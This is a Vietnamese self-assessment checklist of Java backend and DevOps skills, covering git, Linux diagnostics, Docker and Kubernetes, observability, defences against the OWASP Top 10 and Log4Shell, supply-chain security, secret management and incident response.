- [ ] Tôi dùng được cherry-pick, revert, reset, reflog và `git bisect run` để tìm commit gây lỗi.
- [ ] Tôi chẩn đoán được service Java trên Linux: thread ăn CPU (`top -H` + `jstack`), FD leak (`lsof`, `/proc/<pid>/limits`), trạng thái TCP (`ss`), phân tích log bằng `grep/awk/jq`.
- [ ] Tôi viết được Dockerfile multi-stage với layered jar, non-root, exec-form ENTRYPOINT, và biết khi nào dùng Jib/Buildpacks/distroless.
- [ ] Tôi giải thích được JVM nhận limit từ cgroup thế nào, vì sao heap chỉ là một phần bộ nhớ, phân biệt `OutOfMemoryError` và OOMKilled, SerialGC trong container nhỏ, và CPU throttling.
- [ ] Tôi viết được manifest K8s đầy đủ (Deployment, Service, Ingress, ConfigMap/Secret, probes, resources, PDB, HPA) và giải thích từng trường.
- [ ] Tôi thiết kế được probes đúng (không đưa dependency ngoài vào liveness) và graceful shutdown không mất request (preStop, `terminationGracePeriodSeconds`, `server.shutdown=graceful`).
- [ ] Tôi giải thích được rolling update và yêu cầu tương thích ngược (expand–contract cho DB).
- [ ] Tôi thiết kế được pipeline CI/CD build once – deploy many với quality & security gate, và biết bảo vệ chính pipeline.
- [ ] Tôi phân biệt rolling, blue-green, canary, feature flag, GitOps và trade-off của chúng.
- [ ] Tôi dựng được structured logging với MDC (kể cả qua thread), metric Micrometer không bị cardinality explosion, tracing OpenTelemetry xuyên service.
- [ ] Tôi áp dụng được RED/USE/Golden signals, định nghĩa SLI/SLO, tính error budget và viết burn-rate alert multi-window.
- [ ] Tôi nêu và phòng chống được các mục OWASP Top 10 trong Java: IDOR, injection (SQL/JPQL/ORDER BY/command/SpEL), SSRF, insecure deserialization, XXE, misconfiguration Actuator, mật mã & JWT.
- [ ] Tôi kể được case Log4Shell: cơ chế, phạm vi version, chuỗi bản vá, và bài học (SBOM, vá nhanh, egress filtering).
- [ ] Tôi thiết lập được SCA (Dependency-Check/Snyk/Dependabot), triage CVE, và hiểu các mối đe dọa supply chain (dependency confusion, ký artifact, SBOM).
- [ ] Tôi trình bày được chiến lược quản lý secret (secret manager, file mount, workload identity, rotation, xử lý khi lộ) và kiến thức TLS/mTLS đủ để debug `PKIX path building failed`.
- [ ] Tôi điều phối được một sự cố (vai trò, mitigate trước, giao tiếp) và viết được postmortem blameless với action items cụ thể.
